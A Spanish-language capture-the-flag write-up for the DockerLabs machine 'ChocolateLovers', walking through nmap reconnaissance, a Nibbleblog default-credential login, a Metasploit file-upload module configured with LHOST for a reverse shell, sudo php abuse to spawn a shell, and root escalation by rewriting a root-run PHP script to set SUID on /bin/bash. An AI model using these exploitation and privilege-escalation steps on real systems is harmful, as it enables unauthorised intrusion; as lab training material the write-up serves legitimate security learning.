#MAQUINA #DOCKERLABS #FACIL 
#ABUSO_SUBIDA_ARCHIVOS
#METASPLOIT #MSFCONSOLE
<hr>

# RECONOCIMIENTO

Vamos a resolver **ChocolateLovers** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-25 14:02 CET
Initiating ARP Ping Scan at 14:02
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 14:02, 0.03s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 14:02
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 14:02, 0.50s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2024-11-25 14:02:05 CET for 1s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.72 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** abierto.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p80 172.17.0.2 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-25 14:02 CET
Nmap scan report for 172.17.0.2
Host is up (0.000019s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.38 seconds



```

   ```bash
nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-25 14:03 CET
Nmap scan report for 172.17.0.2
Host is up (0.0000030s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

## HTTP (80)

Al revisar la web que hay en el puerto 80, vemos que hay un comentario al hacer CTRL + U -> **/nibbleblog**

# EXPLOTACION

Al revisar el nibbleblog , vemos que la versión tiene un exploitable en searchsploit.

   ```bash
searchsploit nibbleblog        
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                      |  Path
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nibbleblog 3 - Multiple SQL Injections                                                                              | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                                                               | php/remote/38489.rb
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

Antes de enfocarnos en ello si fuese necesario, he probado a entrar como admin:
**usuario : admin**
**contraseña: admin**

Luego con **msfconsole** nos hemos otorgado una shell:

   ```bash
msf6 exploit(multi/http/nibbleblog_file_upload) > set PASSWORD admin
PASSWORD => admmin
msf6 exploit(multi/http/nibbleblog_file_upload) > set USERNAME admin
USERNAME => admin
msf6 exploit(multi/http/nibbleblog_file_upload) > set TARGETURI /nibbleblog
TARGETURI => /nibbleblog
msf6 exploit(multi/http/nibbleblog_file_upload) > set RHOSTS 172.17.0.2
RHOSTS => 172.17.0.2
msf6 exploit(multi/http/nibbleblog_file_upload) > set LHOST 172.17.0.1
LHOST => 172.17.0.1

```

# ESCALADA PRIVILEGIOS

Una vez nos hemos otorgado una shell completamente interactiva, vemos si el usuario tiene permisos SUDO:
   ```bash
www-data@29e66507ff68:/$ sudo -l
Matching Defaults entries for www-data on 29e66507ff68:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on 29e66507ff68:
    (chocolate) NOPASSWD: /usr/bin/php



```

Vemos **php** con permisos SUDO :
   ```bash
www-data@29e66507ff68:/$ sudo -u chocolate php -r "system('/bin/bash');"

```

YA ESTAMOS COMO CHOCOLATE

Vemos con **ps -ef** que root ejecuta un comando en bucle:
   ```bash
 ps -ef
UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 16:08 ?        00:00:00 /bin/sh -c service apache2 start && while true; do php /opt/script.php; sleep 5; done

```

El script es nuestro, así que lo cambiamos para que bash tenga SUID
   ```bash

echo "<?php exec('chmod +s /bin/bash') ?>" >script.php 
chocolate@29e66507ff68:/opt$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
chocolate@29e66507ff68:/opt$ bash -p

```

**YA ESTAMOS COMO ROOT.**